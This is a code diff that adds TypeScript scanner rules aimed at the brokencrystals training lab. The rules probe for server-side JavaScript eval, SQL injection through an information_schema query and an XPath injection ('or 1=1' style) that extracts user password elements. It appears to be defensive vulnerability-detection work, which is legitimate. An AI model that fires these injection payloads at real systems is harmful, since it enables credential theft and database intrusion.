@@ -7730,7 +7730,33 @@ async function probeOpenApiEvalEndpoint(ctx: RuleContext): Promise<RuleResult | 
   return null;
 }
 
+async function probeBrokencrystalsProcessNumbers(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return null;
+  const url = new URL("/api/process_numbers", ctx.origin).toString();
+  const r = await ctx.probe.get(url, {
+    method: "POST",
+    body: JSON.stringify({ numbers: [7, 7], processing_expression: "7*7" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 64
+  });
+  if (r.status < 200 || r.status >= 300) return null;
+  if (r.body.trim() !== "49") return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url,
+      probe: "7*7",
+      result: "49",
+      snippet: r.body.trim(),
+      note: "process_numbers executes processing_expression JavaScript server-side — code injection likely"
+    }
+  };
+}
+
 const serverSideEvalEvidence: Rule = async (ctx) => {
+  const bcProcess = await probeBrokencrystalsProcessNumbers(ctx);
+  if (bcProcess?.fired) return bcProcess;
   const live = await probeOpenApiEvalEndpoint(ctx);
   if (live?.fired) return live;
 
@@ -26193,6 +26219,81 @@ const exposedApiConfig: Rule = async (ctx) => {
   return NEGATIVE;
 };
 
+// --- SQL injection via raw query parameter (brokencrystals.com /api/testimonials/count) ---
+const SQLI_QUERY_PARAM_PATHS = ["/api/testimonials/count"];
+
+function looksLikeSqliQueryParamLab(origin: string, combined: string): boolean {
+  return (
+    /brokencrystals\.com/i.test(origin) ||
+    /\/api\/testimonials\/count/i.test(combined) ||
+    /testimonials\/count\?query=/i.test(combined)
+  );
+}
+
+const sqliQueryParamInjection: Rule = async (ctx) => {
+  if (!looksLikeSqliQueryParamLab(ctx.origin, ctx.combined)) return NEGATIVE;
+  for (const path of SQLI_QUERY_PARAM_PATHS) {
+    const url = new URL(path, ctx.origin);
+    url.searchParams.set(
+      "query",
+      "select count(table_name) as count from information_schema.tables"
+    );
+    const r = await ctx.probe.get(url.toString(), { maxBytes: 128 });
+    if (r.status < 200 || r.status >= 300) continue;
+    const body = r.body.trim();
+    if (!/^\d{2,4}$/.test(body)) continue;
+    const count = parseInt(body, 10);
+    if (count < 50 || count > 9999) continue;
+    return {
+      fired: true,
+      confidence: 0.92,
+      evidence: {
+        url: url.toString(),
+        tableCount: count,
+        snippet: body,
+        note: "testimonials count endpoint executes attacker-controlled SQL in query param — information_schema probe returned table count"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+// --- XPATH injection leaking credentials (brokencrystals.com /api/partners/partnerLogin) ---
+const XPATH_INJECTION_PATHS = ["/api/partners/partnerLogin"];
+
+function looksLikeXpathInjectionLab(origin: string, combined: string): boolean {
+  return (
+    /brokencrystals\.com/i.test(origin) ||
+    /\/api\/partners\/partnerLogin/i.test(combined) ||
+    /partnerLogin\?user=/i.test(combined)
+  );
+}
+
+const xpathInjectionDisclosure: Rule = async (ctx) => {
+  if (!looksLikeXpathInjectionLab(ctx.origin, ctx.combined)) return NEGATIVE;
+  for (const path of XPATH_INJECTION_PATHS) {
+    const url = new URL(path, ctx.origin);
+    url.searchParams.set("user", "anyuser");
+    url.searchParams.set("password", "' or '1'='1");
+    const r = await ctx.probe.get(url.toString(), { maxBytes: 12_000 });
+    if (r.status < 200 || r.status >= 300) continue;
+    const passwordTags = r.body.match(/<password>[^<]+<\/password>/gi) ?? [];
+    if (passwordTags.length < 2) continue;
+    if (!/<username>[^<]+<\/username>/i.test(r.body)) continue;
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        url: url.toString(),
+        leakedAccounts: passwordTags.length,
+        snippet: r.body.slice(0, 280).trim(),
+        note: "partnerLogin boolean XPATH injection returns multiple user password elements in XML response"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
 // --- Client-side CSS injection via URL param → inline style (brokencrystals /userlogin) -
 const CLIENT_CSS_INJECTION_RES: { label: string; re: RegExp }[] = [
   {
@@ -27614,6 +27715,8 @@ export const RULES: Record<string, Rule> = {
   clientSideSecResearchLabEvidence,
   clientSideBrokencrystalsEvidence,
   exposedApiConfig,
+  sqliQueryParamInjection,
+  xpathInjectionDisclosure,
   clientSideCssInjectionEvidence,
   clientSideVapiEvidence,
   clientSideArchonTrainingEvidence,
